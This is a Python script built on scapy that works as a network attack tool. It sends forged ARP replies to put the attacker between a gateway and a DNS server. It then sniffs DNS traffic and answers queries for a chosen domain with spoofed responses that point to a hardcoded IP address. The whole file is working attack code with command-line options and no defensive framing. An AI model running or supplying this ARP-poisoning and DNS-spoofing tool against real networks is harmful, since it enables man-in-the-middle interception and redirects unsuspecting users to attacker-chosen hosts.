import subprocess
import optparse

from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import getmacbyip, ARP, Ether


def dns_spoof(packet):
    redirect_to = '216.58.207.78'
    target = domain + "."
    if DNSQR in packet and packet.dport == 53:
        print(packet.qd.qname)
        if (packet.qd.qname == target):
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1,
                              an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=redirect_to))

            packet.qd.qname = target
            send(spoofed_pkt)


   # elif DNSRR in packet and packet.sport == 53:
            #     if (packet.an.rrname == target):
            #         packet.an.rdata = redirect_to
            #         print(packet.an.ttl)
            #         send(packet)
            #         print(packet.an.rdata)
#         print(packet.an.rrname)

def send_arp_request(interface, src, target):
    src_mac = get_if_hwaddr(interface)
    target_mac = getmacbyip(target)
    arp_request = ARP()
    arp_request.op = 2
    arp_request.hwsrc = src_mac
    arp_request.psrc = src
    arp_request.hwdst = target_mac
    arp_request.pdst = target
    send(arp_request)

parser = optparse.OptionParser()


parser.add_option("-i", "--iface", dest="interface", help="Interface you wish to use")
parser.add_option("-d", "--dns", dest="dns", help="The dns server address")
parser.add_option("-g", "--gateway", dest="target", help="gateway ip")
parser.add_option("--domain", dest="domain", help="Domain to be spoofed ")

(options, arguments) = parser.parse_args()


if not options.interface:
    print("[E] No  interface specified.  -h for help.")
    sys.exit(0)

if not options.dns:
    print("[E] No  dns specified.  -h for help.")
    sys.exit(0)

if not options.target:
    print("[E] No  target specified.  -h for help.")
    sys.exit(0)

if not options.domain:
    print("[E] No  domain specified.  -h for help.")
    sys.exit(0)

interface = options.interface
dns_server = options.dns
target_ip = options.target
domain = options.domain
send_arp_request(interface, dns_server, target_ip)
send_arp_request(interface, target_ip, dns_server)

sniffed = sniff(iface=interface, filter="udp and port 53", prn=dns_spoof)